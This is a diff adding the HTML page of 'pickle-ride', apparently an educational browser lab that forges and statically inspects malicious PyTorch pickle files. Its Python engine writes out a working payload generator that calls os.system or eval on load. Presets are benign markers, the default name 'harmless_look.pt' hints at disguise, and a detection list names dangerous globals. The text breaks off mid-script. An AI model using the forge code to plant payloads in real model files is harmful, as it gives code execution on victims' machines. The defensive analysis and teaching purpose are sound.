@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<!-- 🥒 pickle-ride · docs/index.html · complete build -->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#060a07">
+<meta name="description" content="pickle-ride — client-side PyTorch pickle deserialization lab. Forge and statically inspect malicious .pt models in a WASM sandbox.">
+<title>pickle-ride · browser lab</title>
+<script src="https://cdn.jsdelivr.net/pyodide/v314.0.7/full/pyodide.js"></script>
+<style>
+  :root{
+    --bg:#060a07; --bg2:#0a120c; --surface:#0e1710; --surface2:#122016;
+    --line:#1c3322; --line2:#2c5236;
+    --txt:#d9f6d6; --dim:#7fa886; --sub:#a9e8a6;
+    --acid:#8dff2a; --green:#39d353; --cyan:#37e6ff; --blue:#4aa8ff;
+    --magenta:#ff4fa3; --amber:#ffcf5c; --red:#ff5c6c;
+    --ink:#06210a;
+    color-scheme:dark;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0}
+  html{scrollbar-width:thin;scrollbar-color:var(--line2) var(--bg2)}
+  ::-webkit-scrollbar{width:10px;height:10px}
+  ::-webkit-scrollbar-track{background:var(--bg2)}
+  ::-webkit-scrollbar-thumb{background:linear-gradient(var(--line2),var(--green));border-radius:999px;border:2px solid var(--bg2)}
+  ::-webkit-scrollbar-thumb:hover{background:linear-gradient(var(--green),var(--acid))}
+  body{
+    background:var(--bg);color:var(--txt);
+    font:16px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden;
+  }
+  code,pre,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+
+  .bg{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
+  .blob{position:absolute;border-radius:50%;filter:blur(70px);opacity:.5;mix-blend-mode:screen}
+  .b1{width:60vmax;height:60vmax;left:-18vmax;top:-22vmax;
+      background:radial-gradient(circle,rgba(57,211,83,.55),transparent 62%);animation:drift1 22s ease-in-out infinite alternate}
+  .b2{width:52vmax;height:52vmax;right:-16vmax;bottom:-20vmax;
+      background:radial-gradient(circle,rgba(55,230,255,.42),transparent 62%);animation:drift2 26s ease-in-out infinite alternate}
+  .b3{width:38vmax;height:38vmax;left:32vw;top:34vh;
+      background:radial-gradient(circle,rgba(255,79,163,.28),transparent 62%);animation:drift3 30s ease-in-out infinite alternate}
+  @keyframes drift1{to{transform:translate(8vmax,6vmax) scale(1.12)}}
+  @keyframes drift2{to{transform:translate(-7vmax,-5vmax) scale(1.08)}}
+  @keyframes drift3{to{transform:translate(-5vmax,7vmax) scale(1.15)}}
+  .grain{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.05;mix-blend-mode:overlay;
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='140' height='140'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='2'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")}
+
+  header{position:sticky;top:0;z-index:20;display:flex;align-items:center;gap:.6rem;
+    padding:.6rem .9rem;padding-top:calc(.6rem + env(safe-area-inset-top));
+    background:rgba(6,10,7,.82);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
+    border-bottom:1px solid var(--line)}
+  .back{width:44px;height:44px;flex:none;border-radius:13px;border:1px solid var(--line2);
+    background:var(--surface);color:var(--txt);font-size:1.25rem;cursor:pointer;transition:.15s}
+  .back:hover{border-color:var(--acid);color:var(--acid)}
+  .brand{flex:1;display:flex;align-items:center;gap:.5rem;font-weight:800;font-size:1.08rem;
+    white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+    background:linear-gradient(90deg,var(--acid),var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .brand .pickle{-webkit-text-fill-color:initial;font-size:1.2rem}
+  .pill{font-size:.68rem;font-weight:600;padding:.32rem .62rem;border-radius:999px;border:1px solid;flex:none;letter-spacing:.02em}
+  .pill.warn{color:var(--amber);border-color:rgba(255,207,92,.5);background:rgba(255,207,92,.08)}
+  .pill.ok{color:var(--acid);border-color:rgba(141,255,42,.5);background:rgba(141,255,42,.08)}
+  .pill.bad{color:var(--red);border-color:rgba(255,92,108,.5);background:rgba(255,92,108,.08);cursor:pointer}
+
+  main{position:relative;z-index:1;flex:1;width:100%;max-width:760px;margin:0 auto;
+    padding:1.1rem 1rem;padding-bottom:calc(1.4rem + env(safe-area-inset-bottom))}
+  .view{display:none}
+  .view.active{display:block;animation:viewIn .3s ease}
+  @keyframes viewIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+
+  .hero{animation:rise .5s ease both}
+  h1{font-size:clamp(2rem,8vw,3rem);line-height:1.05;margin:.3rem 0 .4rem;font-weight:900;letter-spacing:-.02em;
+    background:linear-gradient(100deg,var(--acid) 10%,var(--cyan) 55%,var(--magenta) 100%);
+    -webkit-background-clip:text;background-clip:text;color:transparent}
+  .tag{color:var(--sub);font-style:italic;margin:0 0 .5rem;font-size:1.02rem}
+  .hint{color:var(--dim);font-size:.88rem;margin:.2rem 0 1rem}
+  .hint code{color:var(--sub);background:rgba(141,255,42,.08);padding:.05rem .3rem;border-radius:5px}
+  .cards{display:grid;gap:1rem;margin-top:1.4rem}
+  @media(min-width:640px){.cards{grid-template-columns:1fr 1fr}}
+  .card{position:relative;display:flex;flex-direction:column;align-items:flex-start;gap:.5rem;width:100%;
+    text-align:left;padding:1.35rem;min-height:172px;border-radius:22px;cursor:pointer;overflow:hidden;
+    border:1px solid var(--line2);background:linear-gradient(160deg,var(--surface2),var(--surface));
+    color:var(--txt);font:inherit;transition:transform .14s ease,border-color .2s,box-shadow .25s;animation:rise .5s ease both}
+  .card:nth-child(1){animation-delay:.08s}.card:nth-child(2){animation-delay:.16s}
+  .card::before{content:"";position:absolute;inset:0;opacity:.16;transition:opacity .25s;
+    background:radial-gradient(120% 90% at 100% 0%,var(--glow),transparent 60%)}
+  .card.gen{--glow:var(--acid)}.card.ana{--glow:var(--cyan)}
+  .card:hover,.card:focus-visible{transform:translateY(-3px);border-color:var(--glow);box-shadow:0 12px 40px -18px var(--glow)}
+  .card:hover::before{opacity:.3}
+  .card:active{transform:scale(.985)}
+  .card .ico{display:grid;place-items:center;width:52px;height:52px;border-radius:15px;font-size:1.7rem;
+    background:linear-gradient(145deg,rgba(255,255,255,.06),transparent);border:1px solid var(--line2)}
+  .card b{font-size:1.18rem;color:var(--glow)}
+  .card span.d{font-size:.86rem;color:var(--dim);line-height:1.45}
+  .card .go{margin-top:auto;font-size:.8rem;font-weight:700;color:var(--glow);letter-spacing:.04em}
+  @keyframes rise{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
+  .strip{display:flex;flex-wrap:wrap;gap:.5rem;margin-top:1.3rem;animation:rise .5s .24s ease both}
+  .strip span{font-size:.72rem;color:var(--sub);border:1px solid var(--line);border-radius:999px;
+    padding:.35rem .7rem;background:rgba(255,255,255,.02)}
+
+  h2{font-size:1.3rem;margin:.1rem 0 .6rem;font-weight:800;display:flex;align-items:center;gap:.5rem}
+  h2 .dot{width:9px;height:9px;border-radius:50%;background:var(--acid);box-shadow:0 0 12px var(--acid)}
+  h2.ana .dot{background:var(--cyan);box-shadow:0 0 12px var(--cyan)}
+
+  label.f{display:block;margin:1.05rem 0 .4rem;color:var(--sub);font-size:.72rem;font-weight:700;
+    letter-spacing:.08em;text-transform:uppercase}
+  .frow{display:flex;align-items:center;justify-content:space-between;gap:.6rem;margin:1.05rem 0 .4rem;flex-wrap:wrap}
+  .frow label.f{margin:0}
+  select,textarea,input[type=text]{width:100%;font-size:16px;padding:.8rem;border-radius:13px;
+    border:1px solid var(--line2);background:var(--surface);color:var(--txt);transition:border-color .15s,box-shadow .15s}
+  textarea{min-height:96px;resize:vertical;font-family:ui-monospace,Menlo,Consolas,monospace;line-height:1.5}
+  select:focus,textarea:focus,input[type=text]:focus{outline:none;border-color:var(--acid);box-shadow:0 0 3px rgba(141,255,42,.4)}
+  button:focus-visible,.card:focus-visible,.drop:focus-within{outline:2px solid var(--acid);outline-offset:2px}
+  .modechip{display:inline-block;font-size:.66rem;font-weight:800;letter-spacing:.07em;padding:.3rem .6rem;border-radius:999px;border:1px solid}
+  .modechip.py{color:var(--cyan);border-color:rgba(55,230,255,.5);background:rgba(55,230,255,.08)}
+  .modechip.sh{color:var(--acid);border-color:rgba(141,255,42,.5);background:rgba(141,255,42,.08)}
+  .cmdnote{font-size:.78rem;color:var(--dim);margin:.5rem 0 0;line-height:1.55}
+  .cmdnote code{color:var(--sub);background:rgba(141,255,42,.08);padding:.05rem .3rem;border-radius:5px}
+  #cmd-warn{color:var(--amber);font-size:.8rem;margin:.55rem 0 0;line-height:1.5}
+
+  .btn{width:100%;min-height:52px;margin-top:1rem;padding:.7rem 1rem;border-radius:14px;
+    border:1px solid var(--line2);background:var(--surface);color:var(--txt);
+    font:inherit;font-weight:700;cursor:pointer;transition:transform .1s,filter .15s,border-color .15s}
+  .btn:hover{border-color:var(--sub)}
+  .btn:active{transform:scale(.99)}
+  .btn.primary{background:linear-gradient(100deg,var(--acid),var(--green));border-color:transparent;color:var(--ink)}
+  .btn.primary:hover{filter:brightness(1.08)}
+  .btn.cyan{background:linear-gradient(100deg,var(--cyan),var(--blue));border-color:transparent;color:#04222b}
+  .btn:disabled{opacity:.45;cursor:not-allowed;filter:grayscale(.3)}
+  .actions{display:grid;gap:.6rem;margin-top:.4rem}
+  @media(min-width:480px){.actions{grid-template-columns:1fr 1fr}.actions .wide{grid-column:1/-1}}
+  .actions .btn{margin-top:.6rem}
+
+  .progress{margin:1.1rem 0}
+  .plabel{font-size:.8rem;color:var(--sub);margin-bottom:.45rem;min-height:1.2em;display:flex;gap:.5rem;align-items:center}
+  .plabel::before{content:"";width:7px;height:7px;border-radius:50%;background:var(--acid);
+    box-shadow:0 0 8px var(--acid);animation:pulse 1s ease-in-out infinite}
+  @keyframes pulse{50%{opacity:.3}}
+  .track{height:11px;border-radius:999px;background:var(--bg2);border:1px solid var(--line);overflow:hidden}
+  .fill{height:100%;width:0;border-radius:999px;position:relative;
+    background:linear-gradient(90deg,var(--green),var(--acid),var(--cyan));background-size:200% 100%;
+    transition:width .35s ease;animation:slide 1.6s linear infinite}
+  @keyframes slide{to{background-position:-200% 0}}
+
+  .panel{position:relative;border:1px solid var(--line);border-radius:18px;padding:1.1rem;margin:1.1rem 0;
+    background:linear-gradient(180deg,var(--surface),var(--bg2));overflow:hidden}
+  .panel::before{content:"";position:absolute;left:0;right:0;top:0;height:2px;
+    background:linear-gradient(90deg,var(--acid),var(--cyan),var(--magenta))}
+  .meta{display:flex;flex-wrap:wrap;gap:.4rem .8rem;font-size:.82rem;color:var(--dim);align-items:center}
+  .meta b{color:var(--txt);word-break:break-all}
+  .sha{font-size:.7rem;color:var(--dim);word-break:break-all;cursor:pointer;margin:.55rem 0 0;
+    padding:.4rem .55rem;border:1px dashed var(--line2);border-radius:8px;transition:.15s}
+  .sha:hover{border-color:var(--acid);color:var(--sub)}
+  .banner{padding:.9rem 1rem;border-radius:13px;border:1px solid;margin:.85rem 0;font-weight:600;font-size:.88rem;line-height:1.5}
+  .banner.bad{background:rgba(255,92,108,.09);border-color:rgba(255,92,108,.45);color:#ffb3bb}
+  .banner.warnb{background:rgba(255,207,92,.09);border-color:rgba(255,207,92,.45);color:var(--amber)}
+  .banner.okb{background:rgba(141,255,42,.08);border-color:rgba(141,255,42,.4);color:#c4ff9a}
+  .cmdbar{border:1px solid rgba(255,92,108,.4);border-left:4px solid var(--red);border-radius:12px;
+    background:rgba(255,92,108,.07);padding:.75rem .85rem;margin:.7rem 0}
+  .cmdbar .h{font-size:.8rem;font-weight:700;color:#ffb3bb;margin-bottom:.45rem;display:flex;justify-content:space-between;gap:.5rem}
+  .cmdbar .h .cp{font-size:.68rem;color:var(--dim);cursor:pointer;font-weight:600}
+  .cmdbar .h .cp:hover{color:var(--acid)}
+  .cmdbar pre{margin:0;border:none;background:rgba(0,0,0,.35);max-height:220px}
+  .chip{display:inline-flex;align-items:center;gap:.3rem;margin:.25rem .3rem .25rem 0;
+    padding:.42rem .68rem;border-radius:999px;font-size:.76rem;border:1px solid var(--line2);font-family:ui-monospace,Menlo,monospace}
+  .chip.bad{color:#ffb3bb;border-color:rgba(255,92,108,.45);background:rgba(255,92,108,.08)}
+  .chip.dim{color:var(--dim)}
+  .chip.info{color:var(--cyan);border-color:rgba(55,230,255,.4);background:rgba(55,230,255,.07)}
+  pre{background:#040705;border:1px solid var(--line);border-radius:11px;padding:.85rem;
+    font-size:.74rem;line-height:1.5;overflow:auto;max-height:340px;white-space:pre-wrap;word-break:break-word;color:var(--sub)}
+  details{margin:.75rem 0;border:1px solid var(--line);border-radius:13px;padding:.55rem .85rem;background:rgba(255,255,255,.015)}
+  summary{cursor:pointer;color:var(--sub);min-height:38px;display:flex;align-items:center;font-size:.9rem;font-weight:600;list-style:none}
+  summary::-webkit-details-marker{display:none}
+  summary::before{content:"▸";margin-right:.55rem;color:var(--acid);transition:transform .2s}
+  details[open] summary::before{transform:rotate(90deg)}
+
+  .drop{display:flex;flex-direction:column;align-items:center;gap:.55rem;padding:2.6rem 1rem;
+    border:2px dashed var(--line2);border-radius:20px;text-align:center;cursor:pointer;
+    background:linear-gradient(160deg,var(--surface2),var(--surface));transition:.2s}
+  .drop:hover{border-color:var(--cyan)}
+  .drop.drag{border-color:var(--cyan);background:rgba(55,230,255,.08);box-shadow:0 0 40px -16px var(--cyan)}
+  .drop .ico{font-size:2.6rem;filter:drop-shadow(0 0 14px rgba(55,230,255,.5))}
+  .drop b{color:var(--cyan);font-size:1.05rem}
+  .drop span{font-size:.8rem;color:var(--dim)}
+  #file{display:none}
+
+  .err{color:var(--red);font-size:.85rem;white-space:pre-wrap;margin:.6rem 0}
+
+  footer{position:relative;z-index:1;text-align:center;padding:1.2rem 1rem;
+    padding-bottom:calc(1.2rem + env(safe-area-inset-bottom));color:var(--dim);font-size:.85rem;border-top:1px solid var(--line)}
+  footer a{color:var(--sub);text-decoration:none;font-weight:600}
+  footer a:hover{color:var(--acid)}
+
+  #toast{position:fixed;left:50%;bottom:calc(1.2rem + env(safe-area-inset-bottom));transform:translate(-50%,20px);
+    z-index:50;background:var(--surface2);border:1px solid var(--line2);color:var(--txt);
+    padding:.7rem 1.1rem;border-radius:12px;font-size:.85rem;font-weight:600;opacity:0;pointer-events:none;
+    transition:.25s;box-shadow:0 10px 40px -12px rgba(0,0,0,.8)}
+  #toast.show{opacity:1;transform:translate(-50%,0)}
+
+  @media(prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}}
+</style>
+</head>
+<body>
+
+<div class="bg" aria-hidden="true"><div class="blob b1"></div><div class="blob b2"></div><div class="blob b3"></div></div>
+<div class="grain" aria-hidden="true"></div>
+
+<header>
+  <button id="back" class="back" hidden aria-label="Back to home">←</button>
+  <div class="brand"><span class="pickle">🥒</span> pickle-ride</div>
+  <div id="engine" class="pill warn" role="status">engine: booting…</div>
+</header>
+
+<main>
+  <!-- ══════════ HOME ══════════ -->
+  <section id="view-home" class="view">
+    <div class="hero">
+      <h1>pickle-ride</h1>
+      <p class="tag mono">"You load it. You lose it."</p>
+      <p class="hint">A client-side lab for PyTorch pickle deserialization. Forge <code>.pt</code> /
+        <code>.pkl</code> payloads and statically dissect them — opcode by opcode. Everything runs in a
+        Pyodide/WASM sandbox; your files never leave this device.</p>
+    </div>
+    <div class="cards">
+      <button class="card gen" data-go="#/generate">
+        <span class="ico">⚙️</span><b>Payload Generation</b>
+        <span class="d">Forge a payload that runs a shell command or Python expression on an unsafe load. Name it, hash it, download it.</span>
+        <span class="go">FORGE →</span>
+      </button>
+      <button class="card ana" data-go="#/analyze">
+        <span class="ico">🔍</span><b>Payload Analysis</b>
+        <span class="d">Upload any model. Recover the exact command or Python it would run and flag dangerous globals — never executed.</span>
+        <span class="go">INSPECT →</span>
+      </button>
+    </div>
+    <div class="strip">
+      <span>100% client-side</span><span>WASM sandbox</span><span>static audit</span>
+      <span>opcode disassembly</span><span>educational · lab use only</span>
+    </div>
+  </section>
+
+  <!-- ══════════ GENERATE ══════════ -->
+  <section id="view-generate" class="view">
+    <h2><span class="dot"></span> Payload Generation</h2>
+    <p class="hint">Fires only on an unsafe load: <code>pickle.load()</code> or
+      <code>torch.load(file, weights_only=False)</code>. torch ≥ 2.6 defaults to
+      <code>weights_only=True</code> (safe) — the loading code must explicitly opt out.
+      <b>os.system</b> runs a shell command; <b>builtins.eval</b> runs a Python expression only.</p>
+
+    <label class="f" for="preset">Preset</label>
+    <select id="preset">
+      <option value="">— custom —</option>
+      <option value="system|touch YOU_HAVE_BEEN_PWNED">shell · touch marker (classic)</option>
+      <option value="eval|__import__('pathlib').Path('PWNED.txt').write_text('pickle-ride: Python ran during load')">python · write PWNED.txt (live in sandbox)</option>
+      <option value="eval|print('🥒 pickle-ride: arbitrary Python executed during load')">python · print banner (live in sandbox)</option>
+    </select>
+
+    <label class="f" for="kind">Execution target</label>
+    <select id="kind">
+      <option value="system">posix.system — shell command (Linux / macOS)</option>
+      <option value="system_nt">nt.system — shell command (Windows)</option>
+      <option value="eval">builtins.eval — Python expression (any OS)</option>
+    </select>
+
+    <div class="frow">
+      <label class="f" id="cmd-label" for="cmd">Shell command to execute on insecure load</label>
+      <span id="mode-chip" class="modechip sh">SHELL · os.system</span>
+    </div>
+    <textarea id="cmd" spellcheck="false" autocapitalize="off" autocomplete="off">touch YOU_HAVE_BEEN_PWNED</textarea>
+    <p id="cmd-hint" class="cmdnote"></p>
+    <p id="cmd-warn" hidden></p>
+
+    <label class="f" for="fmt">Output format</label>
+    <select id="fmt">
+      <option value="zip">.pt — modern ZIP (data.pkl)</option>
+      <option value="legacy">.pt — legacy (magic 0x1950a86a…)</option>
+      <option value="pkl">raw .pkl</option>
+    </select>
+
+    <label class="f" for="fname">Payload filename</label>
+    <input type="text" id="fname" value="harmless_look.pt" spellcheck="false" autocapitalize="off" autocomplete="off" maxlength="120">
+    <p class="cmdnote">The extension auto-matches the format when you switch it — edit the name freely. Used for the download and the analyzer.</p>
+
+    <button id="gen" class="btn primary">⚙️ Generate payload</button>
+
+    <div id="gen-prog" class="progress" hidden>
+      <div class="plabel"></div><div class="track"><div class="fill"></div></div>
+    </div>
+    <p id="gen-err" class="err" hidden></p>
+
+    <div id="gen-result" class="panel" hidden>
+      <div class="meta">📦 <b id="r-size"></b>&nbsp;bytes · <b id="r-fmt"></b> · <b id="r-name"></b></div>
+      <p id="r-sha" class="sha mono" title="tap to copy SHA-256"></p>
+      <div id="r-findings"></div>
+      <div class="actions">
+        <button id="dl" class="btn primary">⬇️ Download</button>
+        <button id="det" class="btn">🧪 Detonate in sandbox</button>
+        <button id="open-ana" class="btn cyan wide">🔍 Open in analyzer</button>
+      </div>
+      <details><summary>opcode disassembly</summary><pre id="r-disasm"></pre></details>
+      <pre id="det-out" hidden></pre>
+    </div>
+  </section>
+
+  <!-- ══════════ ANALYZE ══════════ -->
+  <section id="view-analyze" class="view">
+    <h2 class="ana"><span class="dot"></span> Payload Analysis</h2>
+    <p class="hint">Static scan only — the file is <b>never executed</b>. Supports .pt (zip &amp; legacy),
+      .pkl, .pth, .bin, .ckpt · max 64 MB. Recovered arguments are heuristic; the disassembly is ground truth.</p>
+
+    <label class="drop" id="drop" for="file" tabindex="0">
+      <span class="ico">📦</span><b>Tap to upload</b><span>or drag &amp; drop a model file here</span>
+    </label>
+    <input type="file" id="file" accept=".pt,.pth,.pkl,.bin,.ckpt">
+
+    <div id="ana-prog" class="progress" hidden>
+      <div class="plabel"></div><div class="track"><div class="fill"></div></div>
+    </div>
+
+    <div id="ana-result" hidden>
+      <div class="meta" style="margin-top:.9rem">📄 <b id="a-name"></b>&nbsp;· <b id="a-size"></b></div>
+      <div id="verdict"></div>
+      <div id="a-findings"></div>
+      <div class="actions"><button id="export-report" class="btn cyan wide">⬇️ Export JSON report</button></div>
+      <details id="a-disasm-wrap"><summary>opcode disassembly</summary><pre id="a-disasm"></pre></details>
+    </div>
+  </section>
+</main>
+
+<footer>
+  Made by <a href="https://github.com/giriaryan694-a11y" target="_blank" rel="noopener">Aryan Giri</a>
+  | <a href="https://github.com/giriaryan694-a11y/pickle-ride" target="_blank" rel="noopener">giriaryan694-a11y</a>
+</footer>
+
+<div id="toast" role="status" aria-live="polite"></div>
+
+<!-- ══════════ PYTHON ENGINE ══════════ -->
+<script type="text/x-python" id="py">
+import io, os, json, struct, hashlib, zipfile, pickle, pickletools, contextlib
+
+MAGIC, PROTO_VER = 0x1950A86A20F9469CFC6C, 1001
+DANGER = {("os","system"),("posix","system"),("nt","system"),
+          ("builtins","eval"),("builtins","exec"),("builtins","__import__"),
+          ("subprocess","Popen"),("subprocess","run"),("subprocess","call"),
+          ("subprocess","check_output"),("shutil","rmtree"),("socket","socket"),
+          ("ctypes","CDLL"),("runpy","_run_code"),("pickle","loads")}
+
+def forge(cmd, kind):
+    glob = {"system": b"cposix\nsystem\n", "system_nt": b"cnt\nsystem\n",
+            "eval": b"cbuiltins\neval\n"}[kind]
+    a = cmd.encode()
+    return (b"\x80\x02" + glob + b"X" + struct.pack("<I", len(a)) + a + b"\x85R.").hex()
+
+def _legacy(pkl):
+    b = io.BytesIO()
+    pickle.dump(MAGIC, b, protocol=2); pickle.dump(PROTO_VER, b, protocol=2)
+    pickle.dump({"protocol_version": PROTO_VER, "little_endian": True,
+                 "type_sizes": {"short": 2, "int": 4, "long": 8}}, b, protocol=2)
+    b.write(pkl); pickle.dump([], b, protocol=2)
+    return b.getvalue()
+
+def _zip(pkl):
+    b = io.BytesIO()
+    with zipfile.ZipFile(b, "w", zipfile.ZIP_STORED) as z:
+        z.writestr("archive/data.pkl", pkl); z.writestr("archive/version", "2\n")
+        z.writestr("archive/byteorder", "little")
+    return b.getvalue()
+
+def wrap(pkl_hex, fmt):
+    pkl = bytes.fromhex(pkl_hex)
+    data = {"pkl": pkl, "legacy": _legacy(pkl), "zip": _zip(pkl)}[fmt]
+    return json.dumps({"hex": data.hex(), "size": len(data),
+                       "sha256": hashlib.sha256(data).hexdigest()})
+
+STR_OPS = {"UNICODE","BINUNICODE","SHORT_BINUNICODE","BINUNICODE8","STRING","BINSTRING","SHORT_BINSTRING"}
+BYTE_OPS = {"BYTES","BINBYTES","SHORT_BINBYTES","BINBYTES8"}
+PUSH_SIMPLE = {"NONE","NEWTRUE","NEWFALSE","TRUE","FALSE","INT","BININT","BININT1","BININT2",
+               "LONG","LONG1","LONG4","FLOAT","BINFLOAT","EMPTY_DICT","EMPTY_LIST","EMPTY_SET"}
+
+def _recover_calls(data):
+    stack, memo, calls = [], {}, []
+    mark = object(); next_idx = 0
+    def popn(n): return [stack.pop() if stack else "?" for _ in range(n)][::-1]
+    def popmark():
+        out = []
+        while stack:
+            v = stack.pop()
+            if v is mark: break
+            out.append(v)
+        return out[::-1]
+    def render(v):
+        if isinstance(v, tuple) and v and v[0] == "global": return v[1] + "." + v[2]
+        if isinstance(v, bytes):
+            try: return v.decode()
+            except Exception: return repr(v)
+        if isinstance(v, (str, int, float, bool)) or v is None: return str(v)
+        if isinstance(v, tuple): return "(" + ", ".join(render(x) for x in v) + ")"
+        return "?"
+    def record(fn, args, pos):
+        if isinstance(fn, tuple) and fn and fn[0] == "global":
+            calls.append({"pos": pos, "module": fn[1], "name": fn[2],
+                          "args": [render(x) for x in args] if isinstance(args, tuple) else ["?"],
+                          "dangerous": (fn[1], fn[2]) in DANGER})
+    for op, arg, pos in pickletools.genops(data):
+        n = op.name
+        if n in STR_OPS or n in BYTE_OPS: stack.append(arg)
+        elif n in PUSH_SIMPLE: stack.append(arg if arg is not None else "?")
+        elif n == "GLOBAL":
+            m, _, f = arg.partition(" "); stack.append(("global", m, f))
+        elif n == "STACK_GLOBAL":
+            f = stack.pop() if stack else "?"; m = stack.pop() if stack else "?"
+            stack.append(("global", render(m), render(f)))
+        elif n == "MARK": stack.append(mark)
+        elif n == "EMPTY_TUPLE": stack.append(())
+        elif n == "TUPLE1": stack.append(tuple(popn(1)))
+        elif n == "TUPLE2": stack.append(tuple(popn(2)))
+        elif n == "TUPLE3": stack.append(tuple(popn(3)))
+        elif n == "TUPLE": stack.append(tuple(popmark()))
+        elif n in ("BINPUT","LONG_BINPUT","PUT"):
+            if stack: memo[arg] = stack[-1]; next_idx = max(next_idx, arg + 1)
+        elif n == "MEMOIZE":
+            memo[next_idx] = stack[-1] if stack else "?"; next_idx += 1
+        elif n in ("BINGET","LONG_BINGET","GET"): stack.append(memo.get(arg, "?"))
+        elif n in ("REDUCE","NEWOBJ"):
+            args = stack.pop() if stack else ()
+            fn = stack.pop() if stack else "?"
+            while fn is mark: fn = stack.pop() if stack else "?"
+            record(fn, args, pos); stack.append("?")
+        elif n == "INST":
+            m, _, f = arg.partition(" ")
+            record(("global", m, f), tuple(popmark()), pos); stack.append("?")
+        elif n == "OBJ":
+            items = popmark()
+            if items: record(items[0], tuple(items[1:]), pos)
+            stack.append("?")
+        elif n == "POP":
+            if stack: stack.pop()
+        elif n == "POP_MARK": popmark()
+        elif n == "DUP":
+            if stack: stack.append(stack[-1])
+        elif n == "APPEND":
+            if stack: stack.pop()
+        elif n == "SETITEM": popn(2)
+        elif n in ("APPENDS","SETITEMS","ADDITEMS"): popmark()
+        elif n in ("LIST","DICT"): stack.append(tuple(popmark()))
+    return calls
+
+def _extract(data):
+    if data[:2] == b"PK":
+        zf = zipfile.ZipFile(io.BytesIO(data))
+        n = next(n for n in zf.namelist() if n.endswith("data.pkl"))
+        return zf.read(n), "ZIP .pt -> " + n
+    f = io.BytesIO(data)
+    ops0 = list(pickletools.genops(f))
+    if any(arg == MAGIC for _, arg, _ in ops0):
+        list(pickletools.genops(f)); list(pickletools.genops(f))
+        return f.read(), "legacy .pt (payload-relative offsets)"
+    return data, "raw pickle stream"
+
+def audit(hexdata):
+    try:
+        data, note = _extract(bytes.fromhex(hexdata))
+        dis = io.StringIO(); pickletools.dis(data, out=dis)
+        findings, strings = [], []
+        for op, arg, pos in pickletools.genops(data):
+            if op.name in ("BINUNICODE","SHORT_BINUNICODE","UNICODE"): strings.append(arg)
+            pair = None
+            if op.name == "GLOBAL":
+                m, _, n = arg.partition(" "); pair = (m, n)
+            elif op.name == "STACK_GLOBAL" and len(strings) >= 2:
+                pair = (strings[-2], strings[-1])
+            if pair:
+                findings.append({"pos": pos, "module": pair[0], "name": pair[1],
+                                 "dangerous": pair in DANGER})
+        calls = _recover_calls(data)
+        verdict = "unsafe" if any(f["dangerous"] for f in findings) or any(c["dangerous"] for c in calls) else "clean"
+        return json.dumps({"ok": True, "container": note, "disasm": dis.getvalue(),
+                           "findings": findings, "calls": calls, "verdict": verdict})
+    except Exception as e:
+        return json.dumps({"ok": False, "error": f"{type(e).__name__}: {e}"})
+
+def detonate(hexdata):
+    data = bytes.fromhex(hexdata)
+    if data[:2] == b"PK": data, _ = _extract(data)
+    before = set(os.listdir("."))
+    report, buf = io.StringIO(), io.StringIO()
+    try:
+        with contextlib.redirect_stdout(buf):
+            f = io.BytesIO(data)
+            first = pickle.load(f)
+            if first == MAGIC:
+                pickle.load(f); pickle.load(f); first = pickle.load(f)
+        report.write(f"unpickle returned: {first!r}\n")
+    except Exception as e:
+        report.write(f"exception: {type(e).__name__}: {e}\n")
+    new = set(os.listdir(".")) - before
+    if buf.getvalue(): report.write("stdout: " + buf.getvalue() + "\n")
+    if new:
+        report.write(f"payload executed - new files in sandbox MEMFS: {sorted(new)}\n")
+        for n in new:
+            try: report.write(f"  {n}: {open(n).read()[:200]}\n")
+            except Exception: pass
+    else:
+        report.write("no new files / stdout in the WASM jail.\n"
+                     "os.system / subprocess are stubbed (no fork/exec) - a shell payload runs for real only on a target.\n"
+                     "builtins.eval runs PYTHON expressions only (not shell) and does execute here.\n")
+    return report.getvalue()
+</script>
+
+<!-- ══════════ APP ══════════ -->
+<script>
+const $ = id => document.getElementById(id);
+const MAX_BYTES = 64 * 1024 * 1024;
+const tick = (ms = 300) => new Promise(r => setTimeout(r, ms));
+const hexToBytes = h => new Uint8Array(h.match(/../g).map(x => parseInt(x, 16)));
+const toHex = buf => {
+  const u = new Uint8Array(buf), parts = [];
+  for (let i = 0; i < u.length; i += 32768)
+    parts.push([...u.subarray(i, i + 32768)].map(b => b.toString(16).padStart(2, "0")).join(""));
+  return parts.join("");
+};
+const fmtSize = n => n < 1024 ? n + " B" : n < 1048576 ? (n/1024).toFixed(1) + " KB" : (n/1048576).toFixed(1) + " MB";
+const FMT_LABEL = { zip: ".pt (zip)", legacy: ".pt (legacy)", pkl: ".pkl" };
+const EXT = { zip: ".pt", legacy: ".pt", pkl: ".pkl" };
+
+let toastTimer;
+function toast(msg) {
+  const t = $("toast"); t.textContent = msg; t.classList.add("show");
+  clearTimeout(toastTimer); toastTimer = setTimeout(() => t.classList.remove("show"), 1900);
+}
+function download(bytes, name, type = "application/octet-stream") {
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(new Blob([bytes], { type }));
+  a.download = name; a.click(); setTimeout(() => URL.revokeObjectURL(a.href), 1000);
+}
+
+/* ── routing ── */
+const TITLES = { home: "pickle-ride · browser lab", generate: "pickle-ride · generate", analyze: "pickle-ride · analyze" };
+function route() {
+  const v = ["generate", "analyze"].includes(location.hash.slice(2)) ? location.hash.slice(2) : "home";
+  document.querySelectorAll(".view").forEach(s => s.classList.toggle("active", s.id === "view-" + v));
